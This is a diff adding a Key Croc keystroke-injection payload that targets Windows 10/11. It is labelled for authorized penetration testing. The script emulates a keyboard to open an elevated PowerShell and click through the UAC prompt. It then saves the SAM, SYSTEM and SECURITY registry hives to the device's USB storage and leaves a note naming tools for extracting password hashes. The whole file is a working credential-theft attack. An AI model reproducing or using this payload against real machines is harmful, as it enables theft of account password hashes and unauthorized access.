@@ -1,0 +1,72 @@
+#!/bin/bash
+# Title: SAM Registry Dump
+# Author: David Osisek (CamoZeroDay)
+# Target: Windows 10/11
+# Version: 1.0
+# Category: Credential Access
+# 
+# ⚠️ FOR AUTHORIZED PENETRATION TESTING ONLY
+# ⚠️ REQUIRES ADMIN PRIVILEGES
+# Dumps SAM, SYSTEM, and SECURITY registry hives
+
+LED SETUP
+
+ATTACKMODE HID STORAGE
+
+LED STAGE1
+Q DELAY 2000
+
+# Open PowerShell as Admin
+LED STAGE2
+Q GUI r
+Q DELAY 500
+Q STRING powershell Start-Process powershell -Verb runAs
+Q ENTER
+Q DELAY 3000
+Q ALT y
+Q DELAY 1000
+
+# Get destination
+LED STAGE3
+Q STRING \$dest=(Get-Volume | Where-Object {\$_.DriveType -eq 'Removable' -and \$_.FileSystemLabel -eq 'KEYCROC'}).DriveLetter
+Q ENTER
+Q DELAY 500
+
+# Dump SAM
+Q STRING reg save HKLM\\SAM "\${dest}:\\SAM.hive"
+Q ENTER
+Q DELAY 2000
+
+# Dump SYSTEM
+Q STRING reg save HKLM\\SYSTEM "\${dest}:\\SYSTEM.hive"
+Q ENTER
+Q DELAY 2000
+
+# Dump SECURITY
+Q STRING reg save HKLM\\SECURITY "\${dest}:\\SECURITY.hive"
+Q ENTER
+Q DELAY 2000
+
+# Create info file
+Q STRING \$info="\${dest}:\\registry-dump-info.txt"
+Q ENTER
+Q STRING "Registry Dump" | Out-File \$info
+Q ENTER
+Q STRING "Computer: "+(Get-WmiObject Win32_ComputerSystem).Name | Out-File -Append \$info
+Q ENTER
+Q STRING "Date: "+(Get-Date) | Out-File -Append \$info
+Q ENTER
+Q STRING "Files: SAM.hive, SYSTEM.hive, SECURITY.hive" | Out-File -Append \$info
+Q ENTER
+Q STRING "Use samdump2 or impacket-secretsdump to extract hashes" | Out-File -Append \$info
+Q ENTER
+Q DELAY 1000
+
+# Exit
+Q STRING exit
+Q ENTER
+
+LED FINISH
+Q DELAY 2000
+
+sync
